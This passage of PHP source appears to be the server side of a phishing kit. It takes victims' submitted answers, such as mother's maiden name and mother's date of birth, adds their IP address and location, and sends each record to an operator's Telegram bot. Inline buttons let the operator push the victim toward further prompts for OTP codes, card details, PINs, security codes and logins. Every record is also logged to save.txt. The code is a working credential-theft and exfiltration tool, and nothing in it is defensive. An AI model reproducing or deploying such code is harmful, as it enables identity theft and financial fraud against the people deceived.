                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }



    else if(isset($_POST["mmn"])){
        $mmn = $_POST['mmn'];
        $baseUrl = $_POST["baseUrl"];

        if($mmn != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "---------------------- \n";
        $message .= "Mother's Maiden Name: ".$mmn."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
         $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }


    else if(isset($_POST["mdb"])){
        $mdb = $_POST['mdb'];
        $baseUrl = $_POST["baseUrl"];

        if($mdb != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "---------------------- \n";
        $message .= "Mother's Date Of Birth: ".$mdb."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
       $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }
	
	
	
?>

